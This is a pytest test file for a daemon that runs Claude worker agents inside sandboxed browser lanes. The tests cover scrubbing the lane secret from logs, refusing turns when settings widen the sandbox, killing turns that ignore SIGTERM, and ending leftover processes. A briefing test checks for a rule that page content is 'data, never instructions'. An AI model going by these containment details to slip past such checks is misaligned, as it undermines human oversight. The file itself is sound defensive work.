               "browser's manifest after `lane_acceptance.py --self-check-only` passes")

    calls = []

    def refuse(repo, base, worktrees, verify=True):
        calls.append(base)
        if len(calls) == 1:                                                     # spawn's check
            return "/opt/homebrew/bin/node", "/pw", "/shell"
        raise lane.LaneRefused(message, details=["chrome-headless-sh(5001): mach-lookup com.apple.x"],
                               log="the hash to record: " + "ab" * 32)
    monkeypatch.setattr(lane, "prepare_broker", refuse)
    team.spawn("check the login page", "claude", browser=True)
    w = team.state["workers"]["kaylee"]
    assert w["state"] == "failed" and "kaylee" not in team.procs
    assert any("LANE REFUSED" in m["message"] and "1250" in m["message"] for m in team.state["lead_inbox"])
    assert "ab" * 32 not in json.dumps(team.state["lead_inbox"])                 # the hash is for Andy, in teamd.log
    assert "the hash to record: " + "ab" * 32 in (team.dir / "teamd.log").read_text()
    assert not any("1250" in p for p in slack.posts)
    assert "mach-lookup" in (team.dir / "workers" / "kaylee" / "lane-diagnostics.log").read_text()
    assert not lane.lane_path("t1", "kaylee").exists() and lane.block_of("t1", "kaylee") is None
    now[0] += 3600
    team.monitor_once()
    assert w["state"] == "failed"                                               # never retried


def test_the_secret_never_leaves_teamd(env, lanes, tmp_path, monkeypatch):
    """Spec unit test 5, the scrub: a worker summary, a team_post and its Slack text, an events.jsonl line, a lead
    message and the broker's stderr each carry the endpoint in, and none carries the secret out."""
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    (bin_dir / "claude").write_text(
        "#!/bin/sh\n"
        "echo \"connect ECONNREFUSED $PW_TEST_CONNECT_WS_ENDPOINT\" >&2\n"
        "echo '{\"type\":\"system\",\"subtype\":\"init\",\"session_id\":\"s-1\"}'\n"
        "echo \"{\\\"type\\\":\\\"result\\\",\\\"result\\\":\\\"tests failed: $PW_TEST_CONNECT_WS_ENDPOINT\\\",\\\"session_id\\\":\\\"s-1\\\"}\"\n"
        "exit ${MOCK_EXIT:-0}\n")
    (bin_dir / "claude").chmod(0o755)
    monkeypatch.setenv("PATH", "%s:%s" % (bin_dir, os.environ["PATH"]))
    slack = FakeSlack()
    team, now = browser_team(env)
    team.slack = slack
    team.spawn("check the login page", "claude", browser=True)
    team.spawn("check the signup page", "claude", browser=True)
    endpoint = "ws://127.0.0.1:41031/" + SECRET
    assert run_until(team, lambda: all(w["state"] == "idle" for w in team.state["workers"].values()))
    token = teamlib.get_token("t1", "kaylee")

    def worker(op, args):
        return team.handle({"op": op, "caller": "kaylee", "token": token, "args": args})
    worker("post", {"text": "connecting to " + endpoint})
    worker("message", {"to": "wash", "text": "my endpoint is " + endpoint})
    worker("ask_lead", {"text": "why does " + endpoint + " refuse?"})
    worker("plan", {"title": "Plan", "markdown": "use " + endpoint})
    team._to_lead("teamd", "LANE REFUSED:", "the lane's browser didn't start: " + endpoint)
    worker("done", {"summary": "failed at " + endpoint, "tests": "npx playwright test: " + endpoint})
    team.log("broker said " + endpoint)
    team._lane_refused("kaylee", lane.LaneRefused("didn't start at " + endpoint,
                                                  details=["node(5000): deny at " + endpoint]))
    collected = json.dumps(team.collect("kaylee"))
    monkeypatch.setenv("MOCK_EXIT", "1")
    team.deliver("wash", "run it again", "lead")
    assert run_until(team, lambda: team.state["workers"]["wash"]["state"] == "failed")
    stored = [json.dumps(team.state), (team.dir / "messages.jsonl").read_text(), "\n".join(slack.posts)]
    stored += [p.read_text() for p in (team.dir / "plans").iterdir()]
    stored += [(team.dir / "teamd.log").read_text(), collected,
               (team.dir / "workers" / "kaylee" / "lane-diagnostics.log").read_text()]
    for wid in ("kaylee", "wash"):
        stored += [(team.dir / "workers" / wid / name).read_text() for name in ("events.jsonl", "stderr.log")]
    log = subprocess.run(["git", "-C", team.state["workers"]["kaylee"]["path"], "log", "-1", "--format=%B"],
                         capture_output=True, text=True).stdout
    for text in stored + [log]:
        assert SECRET not in text
    assert "ws://127.0.0.1:41031/[lane secret]" in "".join(stored)


def test_a_restarted_teamd_sweeps_dead_lanes_and_ends_a_lost_turn(env, lanes, monkeypatch):
    """Spec unit test 6 (the sweep, by exact hash) and review focus: a teamd crash leaves no lane behind."""
    monkeypatch.setenv("MOCK_TURN_SECONDS", "5")
    team, now = browser_team(env)
    for task in ("done", "idle", "lost"):
        team.spawn(task, "claude", browser=True)
    other = lane.ensure_lane("t1-ux", "kaylee")                                 # another team's lane
    lane.allocate_block("t1-ux", "kaylee")
    assert run_until(team, lambda: not team.procs, timeout=15)
    workers_ = team.state["workers"]
    workers_["kaylee"]["state"] = "done"
    workers_["zoe"].update(state="running", pid=999999)                         # mid-turn when teamd died
    team.save()
    again = teamd.Team("t1", env["repo"], "toy goal", team.cfg)                  # the new teamd, from state.json
    again.sweep_lanes()
    assert again.state["workers"]["kaylee"]["lane"] is None and not lane.lane_path("t1", "kaylee").exists()
    assert again.state["workers"]["zoe"]["state"] == "failed" and not lane.lane_path("t1", "zoe").exists()
    assert any("LANE TURN LOST" in m["message"] for m in again.state["lead_inbox"])
    assert lane.lane_path("t1", "wash").is_dir() and lane.block_of("t1", "wash") == 41032   # alive: kept
    assert any(c[0] == lane.lane_path("t1", "wash") and c[2] is None for c in lanes["calls"]["cleanup"])
    assert other.is_dir() and lane.block_of("t1-ux", "kaylee") is not None
    lost = [m["message"] for m in again.state["lead_inbox"] if "LANE TURN LOST" in m["message"]]
    assert "couldn't be confirmed as that turn" in lost[0]                  # pid 999999 isn't that claude


def test_a_stopped_turn_fails_even_when_claude_exits_0_and_the_lead_hears_once(env, lanes, tmp_path, monkeypatch):
    """Review: claude may exit 0 on SIGTERM; a turn the listener check stopped still fails, and LANE STOPPED isn't
    repeated every 60 s while it exits."""
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    (bin_dir / "claude").write_text("#!/bin/sh\ntrap 'sleep 2; exit 0' TERM\n"
                                    "echo '{\"type\":\"system\",\"session_id\":\"s-1\"}'\n"
                                    "sleep 30 & wait $!\n")
    (bin_dir / "claude").chmod(0o755)
    monkeypatch.setenv("PATH", "%s:%s" % (bin_dir, os.environ["PATH"]))
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    w = team.state["workers"]["kaylee"]
    lanes["state"].update(ok=False, problems=["Python (pid 9) listens on port 8000"])
    for _ in range(4):                                       # the check comes due again while the turn exits
        now[0] += 61
        team.monitor_once()
    assert run_until(team, lambda: "kaylee" not in team.procs, timeout=15)
    assert w["state"] == "failed" and "lane_stopped" not in w and w["lane"] is None
    assert len([m for m in team.state["lead_inbox"] if "LANE STOPPED" in m["message"]]) == 1


def test_settings_that_widen_the_sandbox_after_the_spawn_refuse_the_next_turn(env, lanes):
    """Review: settings_widenings runs again at every lane turn, not only at the spawn."""
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    w = team.state["workers"]["kaylee"]
    assert run_until(team, lambda: w["state"] == "idle")
    (env["home"] / ".claude").mkdir()
    (env["home"] / ".claude" / "settings.json").write_text(json.dumps({"sandbox": {"network": {"allowedDomains": ["x.com"]}}}))
    team.deliver("kaylee", "next page", "lead")
    assert w["state"] == "failed" and "kaylee" not in team.procs
    assert any("LANE REFUSED" in m["message"] and "now widen" in m["message"] for m in team.state["lead_inbox"])


def test_a_lost_turn_is_killed_only_if_it_is_still_that_turn(env, monkeypatch, tmp_path):
    """Review: after a restart, teamd kills an old turn only when the pid leads its own group, runs claude, works in
    the worker's folder and started with the turn: a reused pid (Andy's own claude, say) never matches."""
    folder = tmp_path / "wt"
    folder.mkdir()
    now = 10000.0
    answers = {}

    def run(cmd, timeout=60):
        if cmd[0] == "/bin/ps":
            return Ran(0, answers["ps"])
        return Ran(0, "p4242\nfcwd\nn%s\n" % answers["cwd"])
    monkeypatch.setattr(lane, "_run", run)
    monkeypatch.setattr(lane.shutil, "which", lambda name, path=None: "/usr/sbin/" + name)
    cases = [("4242 01:40 claude -p go --output-format stream-json", str(folder), True),     # started at 9900
             ("4242 01:40 claude -p go", "/Users/me/Projects/other", False),               # another folder
             ("4242 1-00:00:00 claude -p go", str(folder), False),                         # a day old
             ("4000 01:40 claude -p go", str(folder), False),                              # not its group's leader
             ("4242 01:40 /usr/bin/python3 server.py", str(folder), False)]                # not claude
    for ps, cwd, expected in cases:
        answers.update(ps=ps, cwd=cwd)
        assert lane.lost_turn(4242, folder, 9900.0, now=now) is expected, ps
    assert lane.lost_turn(None, folder, 9900.0) is False and lane.lost_turn(4242, folder, None) is False
    assert lane._etime_seconds("2-03:04:05") == 2 * 86400 + 3 * 3600 + 4 * 60 + 5 and lane._etime_seconds("x") is None


def test_lead_calls_that_can_start_or_end_a_lane_wait_long_enough(env, monkeypatch):
    """Review: a first install, a broker start or a lane's cleanup runs inside the RPC; the lead mustn't time out on
    a spawn that succeeded."""
    from superyak_team import mcp
    seen = []
    monkeypatch.setattr(mcp, "IS_WORKER", False)
    monkeypatch.setattr(mcp, "resolve_team", lambda requested=None: "t1")
    monkeypatch.setattr(mcp, "daemon_alive", lambda team_id: True)
    monkeypatch.setattr(mcp.teamlib, "get_token", lambda team_id, caller: "tok")
    monkeypatch.setattr(mcp.teamlib, "rpc", lambda team_id, op, caller, args, timeout=30, token="":
                        (seen.append((op, timeout)), {"ok": True, "result": {}})[1])
    for op in ("spawn", "message", "stop", "end", "status", "collect"):
        mcp.call(op, {})
    assert seen == [("spawn", 900), ("message", 900), ("stop", 900), ("end", 900), ("status", 30), ("collect", 30)]


def test_a_scrub_that_cant_write_never_keeps_a_lane_alive(env, lanes, monkeypatch):
    """Fix rounds: scrub_file raises LaneRefused on a write failure; the lane is still removed and its block freed."""
    monkeypatch.setenv("MOCK_TURN_SECONDS", "5")
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)

    def broken(path, secrets_, **kw):
        raise lane.LaneRefused("%s can't be scrubbed of the lane's secret (disk full)" % path)
    monkeypatch.setattr(lane, "scrub_file", broken)
    team.stop_worker("kaylee")
    assert ends_lane(lanes, team)
    assert "can't be scrubbed" in (team.dir / "teamd.log").read_text()


def test_a_check_that_errs_during_a_turn_has_failed(env, lanes, monkeypatch):
    monkeypatch.setenv("MOCK_TURN_SECONDS", "30")
    team, now = browser_team(env)
    r = team.spawn("check the login page", "claude", browser=True)
    broker = lanes["calls"]["started"][0][2]
    monkeypatch.setattr(lane, "settings_widenings", lambda: (_ for _ in ()).throw(ValueError("boom")))
    now[0] += 60
    team.monitor_once()
    assert broker in lanes["calls"]["stopped"]
    assert any("LANE STOPPED" in m["message"] and "check failed" in m["message"] for m in team.state["lead_inbox"])
    assert run_until(team, lambda: team.state["workers"][r["worker"]]["state"] == "failed")


def test_a_check_that_errs_before_a_turn_refuses_the_lane(env, lanes, monkeypatch):
    team, now = browser_team(env)
    monkeypatch.setattr(lane, "listeners_ok", lambda: (_ for _ in ()).throw(RuntimeError("boom")))
    team.spawn("check the login page", "claude", browser=True)
    assert team.state["workers"]["kaylee"]["state"] == "failed" and "kaylee" not in team.procs
    assert lanes["calls"]["started"] == []
    assert any("LANE REFUSED" in m["message"] and "listener check failed" in m["message"]
               for m in team.state["lead_inbox"])


# ---------- Task 8, fix round 1 ----------

def fake_claude(tmp_path, monkeypatch, body):
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir(exist_ok=True)
    (bin_dir / "claude").write_text("#!/bin/sh\n" + body)
    (bin_dir / "claude").chmod(0o755)
    monkeypatch.setenv("PATH", "%s:%s" % (bin_dir, os.environ["PATH"]))


def lead_messages(team, label):
    return [m["message"] for m in team.state["lead_inbox"] if label in m["message"]]


def test_a_stopped_turn_that_ignores_sigterm_is_killed(env, lanes, tmp_path, monkeypatch):
    fake_claude(tmp_path, monkeypatch, "trap '' TERM\n"
                "echo '{\"type\":\"system\",\"session_id\":\"s-1\"}'\n"
                "i=0; while [ $i -lt 100 ]; do sleep 0.1; i=$((i+1)); done\n")
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    proc = team.procs["kaylee"]
    lanes["state"].update(ok=False, problems=["Python (pid 9) listens on port 8000"])
    try:
        for _ in range(20):
            now[0] += 61
            team.monitor_once()
            time.sleep(0.2)
        alive = proc.poll() is None
    finally:
        if proc.poll() is None:
            os.killpg(proc.pid, signal.SIGKILL)
    assert not alive, "the stopped turn still runs after 20 failed-check periods"


def test_the_next_check_counts_from_the_check(env, lanes, monkeypatch):
    monkeypatch.setenv("MOCK_TURN_SECONDS", "30")
    team, now = browser_team(env)
    real_start = lane.start_broker

    def slow_start(*a):
        now[0] += 50
        return real_start(*a)
    monkeypatch.setattr(lane, "start_broker", slow_start)
    team.spawn("check the login page", "claude", browser=True)
    now[0] = 1000.0 + lane.CHECK_EVERY_S                 # 60 s after listeners_ok ran
    team.monitor_once()
    team.stop_worker("kaylee")
    assert lanes["calls"]["listeners"] == 2


def test_the_prepare_runs_before_the_listener_check(env, lanes, monkeypatch):
    order = []
    team, now = browser_team(env)
    real = lane.listeners_ok
    monkeypatch.setattr(lane, "listeners_ok", lambda: (order.append("check"), real())[1])
    monkeypatch.setattr(lane, "prepare_broker", lambda repo, base, wt, verify=True: (
        order.append("prepare" if not verify else "verify"), ("/n", "/pw", "/shell"))[1])
    team.spawn("check the login page", "claude", browser=True)
    assert order[-3:] == ["prepare", "check", "verify"], order


def test_a_sweep_ends_a_lane_by_its_registry_block_not_state_jsons(env, lanes, monkeypatch):
    monkeypatch.setenv("MOCK_TURN_SECONDS", "0")
    team, now = browser_team(env)
    team.spawn("check", "claude", browser=True)
    assert run_until(team, lambda: not team.procs)
    team.state["workers"]["kaylee"]["state"] = "done"   # worker_done saved; the deferred _lane_end then crashed
    team.save()
    lane.release_block("t1", "kaylee")                   # while A was down, B's allocate_block reclaimed it
    assert lane.allocate_block("t2-b", "zoe") == 41000
    again = teamd.Team("t1", env["repo"], "toy goal", team.cfg)
    again.sweep_lanes()
    bases = [c[1] for c in lanes["calls"]["cleanup"] if c[0] == lane.lane_path("t1", "kaylee")]
    assert bases and 41000 not in bases                  # B's ports are never touched; the folder and env are


def test_a_turn_that_fails_to_launch_ends_its_lane_and_its_broker(env, lanes, monkeypatch):
    team, now = browser_team(env)

    def boom(*a, **k):
        raise RuntimeError("no such claude")
    monkeypatch.setattr(teamd.workers, "claude_command", boom)
    team.spawn("check the login page", "claude", browser=True)
    w = team.state["workers"]["kaylee"]
    assert w["state"] == "failed" and "kaylee" not in team.procs
    assert lanes["calls"]["stopped"] and not lane.lane_path("t1", "kaylee").exists()
    assert lane.block_of("t1", "kaylee") is None
    assert lead_messages(team, "LANE REFUSED")


def test_an_oserror_setting_up_a_lane_fails_the_worker_without_raising(env, lanes, monkeypatch):
    team, now = browser_team(env)

    def boom(team_id, wid):
        raise OSError(28, "No space left on device")
    monkeypatch.setattr(lane, "ensure_lane", boom)
    team.spawn("check the login page", "claude", browser=True)
    assert team.state["workers"]["kaylee"]["state"] == "failed"
    assert any("setup failed" in m for m in lead_messages(team, "LANE REFUSED"))


def test_a_stop_is_saved_at_once(env, lanes, monkeypatch):
    monkeypatch.setenv("MOCK_TURN_SECONDS", "30")
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    lanes["state"].update(ok=False, problems=["Python (pid 9) listens on port 8000"])
    now[0] += 60
    team.monitor_once()
    on_disk = json.loads((team.dir / "state.json").read_text())
    assert any("LANE STOPPED" in m["message"] for m in on_disk["lead_inbox"])
    assert on_disk["workers"]["kaylee"]["lane_stopped"] is True


def test_release_block_says_whether_it_released(env, held):
    held("t1")
    lane.allocate_block("t1", "kaylee")
    assert lane.release_block("t1", "kaylee") is True
    assert lane.release_block("t1", "kaylee") is True            # nothing to release is not a failure


def test_a_block_that_cant_be_released_keeps_the_lane_and_tells_the_lead(env, lanes, monkeypatch):
    monkeypatch.setenv("MOCK_TURN_SECONDS", "5")
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    monkeypatch.setattr(lane, "release_block", lambda team_id, wid: False)
    team.stop_worker("kaylee")
    assert team.state["workers"]["kaylee"]["lane"]["base"] == 41000
    assert lead_messages(team, "LANE CLEANUP UNFINISHED")


def test_the_scrub_leaves_non_strings_alone():
    assert lane.scrub(None, ["ab" * 32]) is None and lane.scrub(3, ["ab" * 32]) == 3


def endpoint_claude(tmp_path, monkeypatch):
    fake_claude(tmp_path, monkeypatch,
                "echo \"connect $PW_TEST_CONNECT_WS_ENDPOINT\" >&2\n"
                "echo '{\"type\":\"system\",\"session_id\":\"s-1\"}'\n"
                "echo \"{\\\"type\\\":\\\"result\\\",\\\"result\\\":\\\"at $PW_TEST_CONNECT_WS_ENDPOINT\\\"}\"\n")


def test_a_turns_files_are_scrubbed_when_it_exits_without_ending_the_lane(env, lanes, tmp_path, monkeypatch):
    endpoint_claude(tmp_path, monkeypatch)
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    w = team.state["workers"]["kaylee"]
    assert run_until(team, lambda: w["state"] == "idle")
    for name in ("events.jsonl", "stderr.log"):
        text = (team.dir / "workers" / "kaylee" / name).read_text()
        assert SECRET not in text and "[lane secret]" in text
    assert w["lane"] is not None and lane.lane_path("t1", "kaylee").exists()


def test_the_lane_end_scrubs_the_files_and_the_brokers_stderr(env, lanes, monkeypatch):
    monkeypatch.setenv("MOCK_TURN_SECONDS", "5")
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    wdir = team.dir / "workers" / "kaylee"
    for name in ("events.jsonl", "stderr.log", "broker-stderr.log"):
        (wdir / name).write_text("fail at ws://127.0.0.1:41031/%s\n" % SECRET)
    team.stop_worker("kaylee")
    for name in ("events.jsonl", "stderr.log", "broker-stderr.log"):
        assert SECRET not in (wdir / name).read_text(), name


def test_collect_is_scrubbed_including_the_diff_stat(env, lanes, monkeypatch):
    monkeypatch.setenv("MOCK_TURN_SECONDS", "5")
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    w = team.state["workers"]["kaylee"]
    w["summary"] = w["tests"] = w["last_message"] = "at ws://127.0.0.1:41031/" + SECRET
    monkeypatch.setattr(teamd.workers, "diff_stat", lambda *a, **k: " a | 1 ws://127.0.0.1:41031/" + SECRET)
    out = team.collect("kaylee")
    assert SECRET not in json.dumps(out) and out["diff_stat"] and "[lane secret]" in out["summary"]
    w["tests"] = None
    assert team.collect("kaylee")["tests"] is None


def test_the_sweep_scrubs_a_dead_turns_events(env, lanes, monkeypatch):
    monkeypatch.setenv("MOCK_TURN_SECONDS", "5")
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    wdir = team.dir / "workers" / "kaylee"
    old = "ws://127.0.0.1:41031/" + "cd" * 32
    for name in ("events.jsonl", "stderr.log", "broker-stderr.log"):
        (wdir / name).write_text("connect %s\n" % old)
    team.state["workers"]["kaylee"]["state"] = "running"
    team.state["workers"]["kaylee"]["pid"] = 999999
    team.save()
    again = teamd.Team("t1", env["repo"], "toy goal", team.cfg)      # a new teamd: it never knew the secret
    again.sweep_lanes()
    for name in ("events.jsonl", "stderr.log", "broker-stderr.log"):
        assert "cd" * 32 not in (wdir / name).read_text(), name


def test_a_plan_title_is_scrubbed(env, lanes, monkeypatch):
    monkeypatch.setenv("MOCK_TURN_SECONDS", "5")
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    team.publish_plan("kaylee", "Plan for ws://127.0.0.1:41031/" + SECRET, "body")
    assert SECRET not in json.dumps(team.state) and SECRET not in json.dumps(team.status())


def test_settings_that_err_before_a_turn_refuse_the_lane(env, lanes, monkeypatch):
    team, now = browser_team(env)
    calls = []

    def widenings():
        calls.append(1)
        if len(calls) > 1:                                # the spawn's own check passes; the lane turn's errs
            raise ValueError("boom")
        return []
    monkeypatch.setattr(lane, "settings_widenings", widenings)
    team.spawn("check the login page", "claude", browser=True)
    assert team.state["workers"]["kaylee"]["state"] == "failed"
    assert any("settings check failed" in m for m in lead_messages(team, "LANE REFUSED"))


def test_settings_that_widen_during_a_turn_are_found_by_the_60s_check(env, lanes, monkeypatch):
    monkeypatch.setenv("MOCK_TURN_SECONDS", "30")
    team, now = browser_team(env)
    slack = FakeSlack()
    team.slack = slack
    team.spawn("check the login page", "claude", browser=True)
    monkeypatch.setattr(lane, "settings_widenings", lambda: ["allowedDomains in ~/.claude/settings.json"])
    now[0] += 60
    team.monitor_once()
    assert any("widen" in m for m in lead_messages(team, "LANE STOPPED"))
    assert any("settings check failed" in p for p in slack.posts)


def test_the_sweep_cleans_a_live_lane_by_its_folder_and_environment(env, lanes, monkeypatch):
    monkeypatch.setenv("MOCK_TURN_SECONDS", "0")
    team, now = browser_team(env)
    team.spawn("check", "claude", browser=True)
    assert run_until(team, lambda: team.state["workers"]["kaylee"]["state"] == "idle")
    again = teamd.Team("t1", env["repo"], "toy goal", team.cfg)
    again.sweep_lanes()
    path = lane.lane_path("t1", "kaylee")
    assert lanes["calls"]["cleanup"][-1][:3] == (path, 41000, None)
    assert lanes["calls"]["cleanup"][-1][4] == ("CLAUDE_CODE_TMPDIR", str(path / "tmp"))
    assert "live lane" in (again.dir / "teamd.log").read_text()


def test_the_sweep_stops_a_lost_turn_that_is_still_that_turn(env, lanes, monkeypatch):
    monkeypatch.setenv("MOCK_TURN_SECONDS", "5")
    team, now = browser_team(env)
    team.spawn("check", "claude", browser=True)
    w = team.state["workers"]["kaylee"]
    w["pid"] = 4242
    team.save()
    sent = []
    monkeypatch.setattr(lane, "lost_turn", lambda pid, cwd, started, now=None: True)
    monkeypatch.setattr(teamd.os, "killpg", lambda pid, sig: sent.append((pid, sig)))
    again = teamd.Team("t1", env["repo"], "toy goal", team.cfg)
    again.sweep_lanes()
    assert sent == [(4242, signal.SIGTERM)]
    assert any("the turn was stopped" in m for m in lead_messages(again, "LANE TURN LOST"))


def test_a_waiting_worker_is_not_retried_while_every_slot_is_taken(env, lanes, monkeypatch):
    monkeypatch.setenv("MOCK_TURN_SECONDS", "30")
    team, now = browser_team(env, max_workers=1)
    lanes["state"].update(ok=False, problems=["x (pid 1) listens on port 5000"])
    team.spawn("check the login page", "claude", browser=True)
    assert team.state["workers"]["kaylee"]["state"] == "waiting"
    plain = team.spawn("write docs", "claude")
    assert team.state["workers"][plain["worker"]]["state"] == "running"
    lanes["state"].update(ok=True, problems=[])
    before = lanes["calls"]["listeners"]
    now[0] += teamd.LANE_RETRY_S + 1
    team.monitor_once()
    assert team.state["workers"]["kaylee"]["state"] == "waiting" and lanes["calls"]["listeners"] == before
    team.stop_worker(plain["worker"])
    now[0] += 1
    team.monitor_once()
    assert team.state["workers"]["kaylee"]["state"] == "running"


def test_one_lane_at_a_time_waits_with_its_own_reason(env, lanes, held, tmp_path):
    held("t1-ux")
    (tmp_path / "cfg.json").write_text(json.dumps({"lane_one_at_a_time": True}))
    lane.ensure_lane("t1-ux", "kaylee")
    lane.allocate_block("t1-ux", "kaylee")
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    assert team.state["workers"]["kaylee"]["state"] == "waiting"
    waiting = lead_messages(team, "LANE WAITING")
    assert len(waiting) == 1 and "one browser lane per machine" in waiting[0]
    assert "once every listener" not in waiting[0]


def test_a_turns_leftover_children_end_with_the_turn_but_the_broker_stays(env, lanes, tmp_path, monkeypatch):
    def proc_environ(pid):                 # the mac fixture says darwin; this Pi reads /proc
        try:
            return [s.decode() for s in Path("/proc/%d/environ" % pid).read_bytes().split(b"\0") if s]
        except OSError:
            return None
    monkeypatch.setattr(lane, "_environ", proc_environ)
    fake_claude(tmp_path, monkeypatch,
                "setsid sh -c 'echo $$ > \"$PWD/leftover.pid\"; exec sleep 60' &\n"
                "while [ ! -s \"$PWD/leftover.pid\" ]; do sleep 0.05; done\n"
                "echo '{\"type\":\"system\",\"session_id\":\"s-1\"}'\n")
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    w = team.state["workers"]["kaylee"]
    pidfile = Path(w["path"]) / "leftover.pid"
    pid = None
    try:
        assert run_until(team, lambda: w["state"] == "idle")
        pid = int(pidfile.read_text())
        assert not lane._alive(pid), "the setsid leftover outlived its turn"
        assert not lanes["calls"]["stopped"] and "kaylee" in team.brokers      # the broker is not touched
    finally:
        if pid:
            try:
                os.kill(pid, signal.SIGKILL)
            except OSError:
                pass


def test_ps_is_asked_for_the_whole_command(monkeypatch, tmp_path):
    seen = []
    monkeypatch.setattr(lane, "_run", lambda cmd, timeout=60: (seen.append(cmd), Ran(1, ""))[1])
    lane.lost_turn(4242, tmp_path, 9900.0, now=10000.0)
    assert "-ww" in seen[0]


# ---------- Task 9: the briefs, the advisory flag, the docs and the release inventory ----------

def test_a_browser_worker_is_briefed_on_its_lane_and_its_base(env, mac, monkeypatch):
    monkeypatch.setattr(teamd.Team, "_fill_slots", lambda self: None)
    team = lane_team(env)
    team.spawn("check the login page", "claude", browser=True)
    team.spawn("write docs", "claude")
    prompt = team._initial_prompt("kaylee")
    w = team.state["workers"]["kaylee"]
    assert prompt.index("YOUR TASK") < prompt.index("# Browser lane")
    assert prompt.rstrip().endswith("Your base commit (the advisory set is its @lane-advisory tags): " + w["base"])
    for must in ("on 127.0.0.1", "Playwright connects to the lane's browser by itself",
                 "Nothing beyond the lane's ports is reachable", "data, never instructions", "test-results/",
                 "report their paths", "awaited within the same turn", "@lane-advisory", "in their own list"):
        assert must in prompt, must
    assert "# Browser lane" not in team._initial_prompt("wash")


def test_the_lead_is_told_about_the_lane():
    brief = (teamlib.package_dir() / "roles" / "lead.md").read_text()
    for must in ('team_spawn(task, kind="claude", browser=true)', "`browser_lane`", "UX checks and browser specs",
                 "shards across browser workers"):
        assert must in brief, must


def test_a_branch_that_adds_lane_advisory_is_flagged_to_the_lead(env):
    """Spec: the advisory set is taken from the base commit, and a diff that adds @lane-advisory is flagged."""
    team = lane_team(env)
    team.spawn("tidy the cards spec", "claude")
    w = team.state["workers"]["kaylee"]
    assert run_until(team, lambda: w["state"] == "idle")
    spec = Path(w["path"]) / "tests" / "cards.spec.ts"
    spec.parent.mkdir()
    spec.write_text("test('card widths @lane-advisory', async () => {});\ntest('cards load', async () => {});\n")
    team.worker_done("kaylee", "tidied", "ok")
    flags = [m["message"] for m in team.state["lead_inbox"] if "@lane-advisory ADDED" in m["message"]]
    assert len(flags) == 1 and "tests/cards.spec.ts: 0 -> 1 occurrences" in flags[0]
    assert "test('card widths @lane-advisory'" in flags[0]
    team.spawn("another", "claude")
    wash = team.state["workers"]["wash"]
    assert run_until(team, lambda: wash["state"] == "idle")
    team.worker_done("wash", "no tags", "ok")
    assert len([m for m in team.state["lead_inbox"] if "@lane-advisory ADDED" in m["message"]]) == 1


def test_the_readme_tells_people_to_keep_the_firewall_on():
    readme = (teamlib.package_dir().parent / "README.md").read_text()
    for must in ('Block all incoming connections" on', "lane-listeners.json", "lane_node", "`/sbin`", "on any port",
                 "lane_one_at_a_time", "exclude_slash_tmp", "Don't make a\n  preset with it until"):
        assert must in readme, must


def test_the_release_inventory_lists_every_lane_file():
    team_dir = teamlib.package_dir().parent
    listed = tomllib.loads((team_dir / "pyproject.toml").read_text())["tool"]["hatch"]["build"]["targets"]["wheel"]["only-include"]
    for name in ("superyak_team/lane.py", "superyak_team/lane_broker.js", "superyak_team/lane/broker.sb.tmpl",
                 "superyak_team/lane/browsers.json", "superyak_team/lane/preload.cjs",
                 "superyak_team/lane/profile_probe.js", "superyak_team/roles/browser-lane.md"):
        assert name in listed and (team_dir / name).is_file(), name
    assert all((team_dir / name).is_file() for name in listed)


def test_a_lane_parent_that_vanishes_fails_the_worker_and_never_raises(env, lanes, tmp_root, monkeypatch):
    """Review (M5): an OSError anywhere in a lane turn's setup refuses the lane; it never escapes _start_turn, spawn
    or monitor_once."""
    parent = tmp_root / ("sy-lane-%d" % os.getuid())
    real_lstat = os.lstat

    def lstat(path, *args, **kwargs):
        if str(path) == str(parent):
            raise PermissionError(13, "Permission denied", str(path))
        return real_lstat(path, *args, **kwargs)
    monkeypatch.setattr(lane.os, "lstat", lstat)
    team, now = browser_team(env)
    team.spawn("check the login page", "claude", browser=True)
    w = team.state["workers"]["kaylee"]
    assert w["state"] == "failed" and "kaylee" not in team.procs
    assert any("LANE REFUSED" in m["message"] and "Permission denied" in m["message"] for m in team.state["lead_inbox"])


def test_an_oserror_in_a_retried_lane_turn_never_stops_monitor_once(env, lanes, monkeypatch):
    """Review (M5): a waiting worker's retry that hits an OSError (here, the registry's disk) fails that worker;
    monitor_once still fills the slots and saves."""
    team, now = browser_team(env)
    lanes["state"].update(ok=False, problems=["Python (pid 9) listens on port 8000"])
    team.spawn("check the login page", "claude", browser=True)
    w = team.state["workers"]["kaylee"]
    assert w["state"] == "waiting"

    def broken(team_id, worker_id):
        raise OSError(28, "No space left on device")
    monkeypatch.setattr(lane, "allocate_block", broken)
    lanes["state"].update(ok=True, problems=[])
    saved = []
    monkeypatch.setattr(team, "save", lambda: saved.append(True))
    now[0] += teamd.LANE_RETRY_S
    team.monitor_once()                                                         # must not raise
    assert w["state"] == "failed" and saved
    assert any("LANE REFUSED" in m["message"] and "No space left" in m["message"] for m in team.state["lead_inbox"])


def test_the_install_runs_before_teamds_lock_and_can_refuse_the_spawn(env, lanes, monkeypatch):
    """Review (N5): prepare_broker, which may download for minutes, runs in spawn before teamd's lock is taken; a
    refusal there refuses the spawn, and nothing is created."""
    team, now = browser_team(env)
    lock_free, refuse = [], []

    def prepare(repo, base, worktrees, verify=True):
        free = []
        probe = threading.Thread(target=lambda: free.append(team.lock.acquire(blocking=False)
                                                            and (team.lock.release() or True)))
        probe.start()
        probe.join()
        lock_free.append(free[0])
        if refuse:
            raise lane.LaneRefused("no manifest hash is recorded for chromium-headless-shell 1250 on darwin-arm64")
        return "/opt/homebrew/bin/node", "/pw", "/shell"
    monkeypatch.setattr(lane, "prepare_broker", prepare)
